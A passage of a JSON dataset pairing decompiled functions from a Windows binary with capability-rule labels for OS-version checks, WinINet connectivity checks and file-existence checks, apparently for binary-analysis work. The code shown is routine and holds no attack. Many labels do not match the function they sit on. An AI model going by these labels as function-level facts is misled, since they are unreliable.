{
    "004328ae": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004328ae(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 4) == 0) {\n        return 0;\n    }\n    uVar1 = fcn.00432884();\n    uVar1 = (*_sym.imp.GDI32.dll_DeleteObject)(uVar1);\n    return uVar1;\n}\n",
        "token_count": 86
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00401cf0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00401cf0(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t **ppiVar7;\n    int32_t *unaff_EBP;\n    uint *puVar8;\n    uint *puVar9;\n    \n    iVar5 = *param_1;\n    if (param_2 < *(iVar5 + -0xc)) {\n        param_2 = *(iVar5 + -0xc);\n    }\n    if (1 < *(iVar5 + -4)) {\n        puVar2 = *param_1;\n        ppiVar7 = puVar2 + -4;\n        iVar5 = puVar2[-3];\n        puVar3 = (**(**ppiVar7 + 0x10))();\n        iVar4 = (***puVar3)(param_2, 1);\n        if (iVar4 == 0) {\n            iVar4 = fcn.00401760();\n        }\n        if (iVar5 < param_2) {\n            param_2 = iVar5;\n        }\n        puVar3 = iVar4 + 0x10;\n        puVar9 = puVar3;\n        puVar8 = puVar2;\n        for (uVar6 = param_2 + 1U >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n            *puVar9 = *puVar8;\n            puVar9 = puVar9 + 1;\n            puVar8 = puVar8 + 1;\n        }\n        for (uVar6 = param_2 + 1U & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n            *puVar9 = *puVar8;\n            puVar8 = puVar8 + 1;\n            puVar9 = puVar9 + 1;\n        }\n        *(iVar4 + 4) = iVar5;\n        piVar1 = puVar2 + -1;\n        LOCK();\n        iVar5 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar5 == 1 || iVar5 + -1 < 0) {\n            (**(**ppiVar7 + 4))(ppiVar7);\n        }\n        *unaff_EBP = puVar3;\n        return;\n    }\n    iVar5 = *(iVar5 + -8);\n    if (iVar5 < param_2) {\n        if (iVar5 < 0x401) {\n            iVar5 = iVar5 * 2;\n        }\n        else {\n            iVar5 = iVar5 + 0x400;\n        }\n        if (iVar5 < param_2) {\n            iVar5 = param_2;\n        }\n        iVar5 = (**(**(*param_1 + -0x10) + 8))(*param_1 + -0x10, iVar5, 1);\n        if (iVar5 == 0) {\n            iVar5 = fcn.00401760();\n        }\n        *param_1 = iVar5 + 0x10;\n        return;\n    }\n    return;\n}\n",
        "token_count": 717
    },
    "00402580": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl\nfcn.00402580(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint arg_ch)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t *piVar3;\n    uint8_t *puVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint *in_FS_OFFSET;\n    int32_t *var_8h;\n    char *var_ch;\n    uint var_10h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43b448;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    iVar9 = 0;\n    var_14h = 0;\n    pcVar5 = var_ch;\n    do {\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    iVar6 = pcVar5 - (var_ch + 1);\n    iVar8 = *(*(*var_8h + 4) + 0x18 + var_8h);\n    if ((0 < iVar8) && (iVar6 < iVar8)) {\n        iVar9 = iVar8 - iVar6;\n    }\n    fcn.00401e60(var_8h);\n    if (var_1ch == '\\0') {\n        var_14h = 4;\n        goto code_r0x0040273e;\n    }\n    var_4h = 1;\n    if ((*(*(*var_8h + 4) + 0x10 + var_8h) & 0x1c0) == 0x40) {\ncode_r0x0040266d:\n        iVar8 = (**(**(*(*var_8h + 4) + 0x28 + var_8h) + 0x1c))(var_ch, iVar6);\n        if (iVar8 == iVar6) {\n            for (; 0 < iVar9; iVar9 = iVar9 + -1) {\n                uVar2 = *(*(*var_8h + 4) + 0x30 + var_8h);\n                piVar3 = *(var_8h + *(*var_8h + 4) + 0x28);\n                if ((*piVar3[9] == 0) || (uVar7 = *piVar3[9],  *piVar3[0xd] + uVar7 <= uVar7)) {\n                    uVar7 = (**(*piVar3 + 4))(uVar2);\n                }\n                else {\n                    *piVar3[0xd] = *piVar3[0xd] + -1;\n                    puVar4 = *piVar3[9];\n                    *piVar3[9] = puVar4 + 1;\n                    *puVar4 = uVar2;\n                    uVar7 = uVar2;\n                }\n                if (uVar7 == 0xffffffff) {\n                    var_14h = 4;\n                    *(var_8h + *(*var_8h + 4) + 0x18) = 0;\n                    goto code_r0x0040273e;\n                }\n            }\n        }\n        else {\n            var_14h = 4;\n        }\n    }\n    else {\n        for (; 0 < iVar9; iVar9 = iVar9 + -1) {\n            uVar2 = *(*(*var_8h + 4) + 0x30 + var_8h);\n            piVar3 = *(var_8h + *(*var_8h + 4) + 0x28);\n            if ((*piVar3[9] == 0) || (uVar7 = *piVar3[9],  *piVar3[0xd] + uVar7 <= uVar7)) {\n                uVar7 = (**(*piVar3 + 4))(uVar2);\n            }\n            else {\n                *piVar3[0xd] = *piVar3[0xd] + -1;\n                puVar4 = *piVar3[9];\n                *piVar3[9] = puVar4 + 1;\n                *puVar4 = uVar2;\n                uVar7 = uVar2;\n            }\n            if (uVar7 == 0xffffffff) {\n                var_14h = 4;\n                break;\n            }\n        }\n        if (var_14h == 0) goto code_r0x0040266d;\n    }\n    *(var_8h + *(*var_8h + 4) + 0x18) = 0;\ncode_r0x0040273e:\n    var_4h = 0;\n    if (var_14h != 0) {\n        var_14h = *(var_8h + *(*var_8h + 4) + 8) | var_14h;\n        if (*(var_8h + *(*var_8h + 4) + 0x28) == 0) {\n            var_14h = var_14h | 4;\n        }\n        fcn.00426fae(var_14h, 0);\n    }\n    var_4h = 0xffffffff;\n    fcn.00402440();\n    *in_FS_OFFSET = var_ch_2;\n    return var_8h;\n}\n",
        "token_count": 1319
    },
    "00402920": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __thiscall fcn.00402920(int32_t *param_1, uint8_t param_2)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43b468;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    uVar4 = 0;\n    fcn.00401e60(param_1);\n    if (var_1ch == '\\0') {\n        uVar4 = 4;\n    }\n    else {\n        piVar1 = *(*(*param_1 + 4) + 0x28 + param_1);\n        var_4h = 1;\n        if ((*piVar1[9] == 0) || (uVar3 = *piVar1[9],  *piVar1[0xd] + uVar3 <= uVar3)) {\n            uVar3 = (**(*piVar1 + 4))(var_8h);\n        }\n        else {\n            *piVar1[0xd] = *piVar1[0xd] + -1;\n            puVar2 = *piVar1[9];\n            *piVar1[9] = puVar2 + 1;\n            *puVar2 = var_8h;\n            uVar3 = var_8h;\n        }\n        if (uVar3 == 0xffffffff) {\n            uVar4 = 4;\n        }\n    }\n    var_4h = 0;\n    if (uVar4 != 0) {\n        uVar4 = *(param_1 + *(*param_1 + 4) + 8) | uVar4;\n        if (*(param_1 + *(*param_1 + 4) + 0x28) == 0) {\n            uVar4 = uVar4 | 4;\n        }\n        fcn.00426fae(uVar4, 0);\n    }\n    var_4h = 0xffffffff;\n    fcn.00402440();\n    *in_FS_OFFSET = var_ch;\n    return param_1;\n}\n",
        "token_count": 565
    },
    "004301dd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004301dd(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 4) == 0) {\n        return 0;\n    }\n    uVar1 = fcn.004301b3();\n    uVar1 = (*_sym.imp.USER32.dll_DestroyMenu)(uVar1);\n    return uVar1;\n}\n",
        "token_count": 86
    },
    "00430f8b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.00430f8b(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t extraout_ECX;\n    int32_t *piVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_8h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    arg_8h_00 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = &stack0xffffffec;\n    if (arg_8h_00 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.0042a68a(arg_8h_00);\n        if (iVar1 == 0) {\n            iVar1 = fcn.0042a68a(arg_8h_00);\n            if (iVar1 == 0) {\n                uVar2 = fcn.0042f7f2(0x433696);\n                *(unaff_EBP + -4) = 0;\n                *(unaff_EBP + 8) = uVar2;\n                iVar1 = fcn.00417c09();\n                if (iVar1 == 0) {\n                    fcn.00429bb0();\n                }\n                (**(extraout_ECX + 0x14))(iVar1);\n                piVar3 = fcn.0042a802(arg_8h_00);\n                uVar2 = *(unaff_EBP + 8);\n                *(unaff_EBP + -4) = 0xffffffff;\n                *piVar3 = iVar1;\n                fcn.0042f7f2(uVar2);\n                piVar3 = *(extraout_ECX + 0x58) + iVar1;\n                *piVar3 = arg_8h_00;\n                if (*(extraout_ECX + 0x5c) == 2) {\n                    piVar3[1] = arg_8h_00;\n                }\n            }\n            else {\n                piVar3 = *(extraout_ECX + 0x58) + iVar1;\n                *piVar3 = arg_8h_00;\n                if (*(extraout_ECX + 0x5c) == 2) {\n                    piVar3[1] = arg_8h_00;\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar1;\n}\n",
        "token_count": 618
    },
    "0040e77e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0040e77e(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint lpVersionInformation;\n    uint var_94h;\n    uint var_88h;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    puVar2 = &var_94h;\n    for (iVar1 = 0x24; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 170
    },
    "0040ea11": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.0040ea11(int32_t *arg_8h, int32_t arg_ch, uint noname_2, uint noname_3, uint32_t arg_18h, uint32_t *arg_1ch, \n            uint *arg_20h, uint noname_7, int32_t *arg_28h)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint16_t *puVar4;\n    code *pcVar5;\n    int32_t *piVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t *piVar11;\n    uint var_48h;\n    uint *var_44h;\n    uint *var_40h;\n    uint *var_34h;\n    uint var_30h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    puVar7 = arg_1ch;\n    piVar6 = arg_8h;\n    iVar10 = 0;\n    var_30h._0_2_ = 0;\n    if (arg_8h == NULL) {\n        return -0x7ff8ffa9;\n    }\n    if (arg_1ch == NULL) {\n        return -0x7ffdfff8;\n    }\n    uVar2 = arg_1ch[2];\n    if (5 < uVar2) {\n        return -0x7ffdfff2;\n    }\n    arg_8h = NULL;\n    if (arg_1ch[3] != 0) {\n        arg_1ch = arg_1ch[1];\n        do {\n            uVar3 = *arg_1ch;\n            if (uVar2 <= uVar3) {\n                return -0x7ffdfff2;\n            }\n            arg_1ch = arg_1ch + 1;\n            arg_8h = arg_8h + 1;\n            (&var_44h)[uVar3] = *puVar7 + iVar10;\n            iVar10 = iVar10 + 0x10;\n        } while (arg_8h < puVar7[3]);\n    }\n    if (arg_8h < uVar2) {\n        iVar10 = arg_8h * 0x10 + *puVar7;\n        iVar9 = uVar2 - arg_8h;\n        piVar11 = &var_48h + (uVar2 - arg_8h);\n        do {\n            *piVar11 = iVar10;\n            iVar10 = iVar10 + 0x10;\n            piVar11 = piVar11 + -1;\n            iVar9 = iVar9 + -1;\n        } while (iVar9 != 0);\n    }\n    iVar10 = -0x7ffdfffd;\n    if (arg_28h == NULL) {\n        arg_28h = &arg_18h;\n    }\n    if (arg_20h == NULL) {\n        arg_20h = &var_30h;\n    }\n    (*_sym.imp.OLEAUT32.dll_VariantClear)(&var_10h);\n    pcVar5 = _sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime;\n    if (0x12 < arg_ch + 0x139aU) goto code_r0x0040ef99;\n    // switch table (19 cases) at 0x40efac\n    switch(*((arg_ch + 0x139aU) * 4 + 0x40efac)) {\n    case 0x40eaf6:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 100))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3]);\n            goto code_r0x0040ef99;\n        }\n        break;\n    case 0x40eb1f:\n        if (puVar7[2] == 2) {\n            if (*var_44h != 3) {\n                iVar10 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&var_10h, var_44h, 0, 3);\n                if (iVar10 < 0) goto code_r0x0040eb45;\n                var_44h = &var_10h;\n            }\n            arg_18h = var_44h[2];\n            if (*var_40h != 3) {\n                iVar10 = (*pcVar5)(&var_10h, var_40h, 0, 3);\n                if (iVar10 < 0) {\ncode_r0x0040eb73:\n                    *arg_28h = 1;\n                    goto code_r0x0040ef99;\n                }\n                var_40h = &var_10h;\n            }\n            iVar10 = (**(*piVar6 + 0x60))(piVar6, arg_18h, var_40h[2], arg_20h);\n            goto code_r0x0040ef99;\n        }\n        break;\n    case 0x40eb96:\n        if (puVar7[2] == 2) {\n            if (*var_44h != 3) {\n                iVar10 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&var_10h, var_44h, 0, 3);\n                if (iVar10 < 0) goto code_r0x0040eb45;\n                var_44h = &var_10h;\n            }\n            iVar10 = (**(*piVar6 + 0x5c))(piVar6, var_44h[2], *var_40h, var_40h[1], var_40h[2], var_40h[3], arg_20h);\n            goto code_r0x0040ef99;\n        }\n        break;\n    case 0x40ebdf:\n        if (puVar7[2] == 5) {\n            iVar10 = 0;\n            do {\n                puVar4 = (&var_44h)[iVar10];\n                uVar1 = *puVar4;\n                if (((uVar1 & 0x4000) == 0) || ((uVar1 & 0xf) == 0)) {\n                    *arg_28h = iVar10;\n                    break;\n                }\n                if ((uVar1 & 0xc) == 0) {\n                    iVar9 = *(puVar4 + 4);\n                }\n                else {\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(*(puVar4 + 4));\n                    puVar4 = (&var_44h)[iVar10];\n                    **(puVar4 + 4) = 3;\n                    iVar9 = *(puVar4 + 4) + 8;\n                }\n                (&var_20h)[iVar10] = iVar9;\n                iVar10 = iVar10 + 1;\n            } while (iVar10 < 4);\n            iVar10 = (**(*piVar6 + 0x58))\n                               (piVar6, var_20h, var_1ch, var_18h, var_14h, *var_34h, var_34h[1], var_34h[2], var_34h[3]\n                               );\n            goto code_r0x0040ef99;\n        }\n        break;\n    case 0x40ec55:\n        if (puVar7[2] == 2) {\n            if (*var_44h != 3) {\n                iVar10 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&var_10h, var_44h, 0, 3);\n                if (iVar10 < 0) goto code_r0x0040eb45;\n                var_44h = &var_10h;\n            }\n            iVar10 = (**(*piVar6 + 0x54))(piVar6, var_44h[2], *var_40h, var_40h[1], var_40h[2], var_40h[3]);\n            goto code_r0x0040ef99;\n        }\n        break;\n    case 0x40ec9f:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x50))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\ncode_r0x0040ecc2:\n            if (-1 < iVar10) {\n                *arg_20h = 8;\n            }\n            goto code_r0x0040ef99;\n        }\n        break;\n    case 0x40ecd9:\n        iVar10 = (**(*piVar6 + 0x4c))(piVar6, arg_20h);\n        goto code_r0x0040ef99;\n    case 0x40ece7:\n        iVar10 = (**(*piVar6 + 0x48))(piVar6, arg_20h);\n        goto code_r0x0040ef99;\n    case 0x40ecf5:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x44))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x0040ecc2;\n        }\n        break;\n    case 0x40ed1a:\n        if (puVar7[2] == 2) {\n            uVar1 = *var_44h;\n            if (((uVar1 & 0x4000) != 0) && ((uVar1 & 0xc) == 0)) {\n                iVar10 = -0x7ffdfffb;\ncode_r0x0040eb45:\n                *arg_28h = 0;\n                goto code_r0x0040ef99;\n            }\n            if (uVar1 == 0x400c) {\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(var_44h[2]);\n                *var_44h[2] = 8;\n                puVar8 = var_44h[2] + 8;\n            }\n            else if (uVar1 == 0x4008) {\n                puVar8 = var_44h[2];\n            }\n            else {\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(var_44h);\n                puVar8 = var_44h + 2;\n                *var_44h = 8;\n            }\n            iVar10 = (**(*piVar6 + 0x40))(piVar6, puVar8, *var_40h, var_40h[1], var_40h[2], var_40h[3], arg_20h + 2);\n            goto code_r0x0040ed90;\n        }\n        break;\n    case 0x40eda7:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x3c))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x0040ecc2;\n        }\n        break;\n    case 0x40edcf:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x38))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h);\n            goto code_r0x0040ef99;\n        }\n        break;\n    case 0x40edf3:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x34))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h);\n            goto code_r0x0040ef99;\n        }\n        break;\n    case 0x40ee17:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x30))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x0040ecc2;\n        }\n        break;\n    case 0x40ee3f:\n        if ((arg_18h & 2) == 0) {\n            if ((arg_18h & 4) == 0) goto code_r0x0040eec3;\n            if (puVar7[2] == 2) {\n                var_20h = *var_44h;\n                var_1ch = var_44h[1];\n                var_18h = var_44h[2];\n                var_14h = var_44h[3];\n                if (*var_40h != 8) {\n                    iVar10 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&var_10h, var_40h, 0, 3);\n                    if (iVar10 < 0) goto code_r0x0040eb73;\n                    var_40h = &var_10h;\n                }\n                iVar10 = (**(*piVar6 + 0x6c))(piVar6, var_20h, var_1ch, var_18h, var_14h, var_40h[2]);\n                goto code_r0x0040ef99;\n            }\n        }\n        else if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x2c))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x0040ecc2;\n        }\n        break;\n    case 0x40eec3:\ncode_r0x0040eec3:\n        if ((arg_18h & 2) == 0) {\n            if ((arg_18h & 4) == 0) goto code_r0x0040ef47;\n            if (puVar7[2] == 2) {\n                var_20h = *var_44h;\n                var_1ch = var_44h[1];\n                var_18h = var_44h[2];\n                var_14h = var_44h[3];\n                if (*var_40h != 8) {\n                    iVar10 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&var_10h, var_40h, 0, 3);\n                    if (iVar10 < 0) goto code_r0x0040eb73;\n                    var_40h = &var_10h;\n                }\n                iVar10 = (**(*piVar6 + 0x68))(piVar6, var_20h, var_1ch, var_18h, var_14h, var_40h[2]);\n                goto code_r0x0040ef99;\n            }\n        }\n        else if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x28))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x0040ecc2;\n        }\n        break;\n    case 0x40ef47:\ncode_r0x0040ef47:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x24))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x0040ef8b;\n        }\n        break;\n    case 0x40ef6c:\n        iVar10 = (**(*piVar6 + 0x20))(piVar6, arg_20h + 2);\ncode_r0x0040ed90:\n        if (-1 < iVar10) {\n            *arg_20h = 3;\n        }\n        goto code_r0x0040ef99;\n    case 0x40ef7e:\n        iVar10 = (**(*piVar6 + 0x1c))(piVar6, arg_20h + 2);\ncode_r0x0040ef8b:\n        if (-1 < iVar10) {\n            *arg_20h = 9;\n        }\n        goto code_r0x0040ef99;\n    }\n    iVar10 = -0x7ffdfff2;\ncode_r0x0040ef99:\n    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_10h);\n    return iVar10;\n}\n",
        "token_count": 3876
    },
    "0040eff8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0040eff8(uint noname_0, int32_t arg_ch, uint32_t arg_10h, uint noname_3, int32_t arg_18h)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_1h;\n    \n    uVar3 = 0;\n    if (arg_10h != 0) {\n        do {\n            bVar1 = false;\n            uVar4 = 0;\n            do {\n                iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(*(arg_ch + uVar3 * 4), *(uVar4 + 0x44c378));\n                if (iVar2 == 0) {\n                    bVar1 = true;\n                    *(arg_18h + uVar3 * 4) = *(uVar4 + 0x44c328);\n                }\n                uVar4 = uVar4 + 4;\n            } while (uVar4 < 0x4c);\n            if (!bVar1) {\n                return 0x80020006;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < arg_10h);\n    }\n    return 0;\n}\n",
        "token_count": 303
    },
    "0040f08a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040f08a(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0xc) == 0) {\n        return 0;\n    }\n    uVar1 = (**(**(param_1 + 0xc) + 0xc))(*(param_1 + 0xc), 0);\n    return uVar1;\n}\n",
        "token_count": 90
    },
    "0040f09f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040f09f(int32_t arg_8h, int32_t **arg_ch, int32_t *arg_10h, int32_t **arg_14h)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    \n    if ((arg_8h == 0) || (arg_ch == NULL)) {\n        iVar3 = -0x7ff8ffa9;\n    }\n    else if (arg_14h == NULL) {\n        iVar3 = -0x7fffbffd;\n    }\n    else {\n        *arg_14h = NULL;\n        if ((((*arg_10h == 0) && (arg_10h[1] == 0)) && (arg_10h[2] == 0xc0)) && (arg_10h[3] == 0x46000000)) {\ncode_r0x0040f14f:\n            piVar4 = arg_ch[1] + arg_8h;\n            (**(*piVar4 + 4))(piVar4);\n            *arg_14h = piVar4;\n            iVar3 = 0;\n        }\n        else {\n            piVar4 = arg_ch[2];\n            while (piVar4 != NULL) {\n                piVar2 = *arg_ch;\n                if ((piVar2 == NULL) ||\n                   (((*piVar2 == *arg_10h && (piVar2[1] == arg_10h[1])) &&\n                    ((piVar2[2] == arg_10h[2] && (piVar2[3] == arg_10h[3])))))) {\n                    if (piVar4 == 0x1) goto 